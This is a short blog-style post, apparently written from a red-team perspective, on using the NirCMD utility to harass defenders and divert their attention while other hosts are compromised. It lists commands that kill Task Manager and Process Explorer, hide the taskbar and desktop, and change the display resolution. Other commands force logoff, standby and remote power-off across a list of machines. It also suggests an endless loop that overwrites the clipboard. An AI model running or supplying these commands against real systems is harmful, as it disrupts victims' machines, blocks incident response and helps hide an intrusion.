<div class="header">
  <h1>Psychological Warfare with NirCMD</h1>
  <h2></h2>
</div>
<div class="content">
  <p>One of the best ways to throw blue teamers off the scent of another host getting owned, which also has the added effect of stressing them out is a batch script that runs through some of the more annoying features in nircmd.exe in succession and at regular intervals:</p>

<p><a href="http://www.nirsoft.net/utils/nircmd.html">http://www.nirsoft.net/utils/nircmd.html</a></p>

<ul>
<li><p>setdisplay 640x480</p></li>

<li><p>killprocess taskmgr.exe</p></li>

<li><p>killprocess procexp.exe</p></li>

<li><p>win -style title &ldquo;my computer&rdquo; 0x00c00000</p></li>

<li><p>win child title &ldquo;my computer&rdquo; +exstyle all 0x00400000</p></li>

<li><p>win +exstyle title &ldquo;my computer&rdquo; 0x00400000</p></li>

<li><p>win trans ititle &ldquo;internet explorer&rdquo; 256</p></li>

<li><p>win close class &ldquo;CabinetWClass&rdquo;</p></li>

<li><p>multiremote copy &ldquo;c:tempcomputers.txt&rdquo; exitwin poweroff force</p></li>

<li><p>exitwin logoff</p></li>

<li><p>standby</p></li>

<li><p>monitor off</p></li>

<li><p>win child class &ldquo;Shell_TrayWnd&rdquo; hide class &ldquo;button&rdquo;</p></li>

<li><p>win hide class progman</p></li>
</ul>

<p>Just to name a few&hellip;</p>

<p>another fun batch script to have running is &lsquo;echo knock knock | clip&rsquo; in an endless and delayless loop. (I makes &lsquo;knock knock&rsquo; the only thing that will ever be pasted ;-)</p>
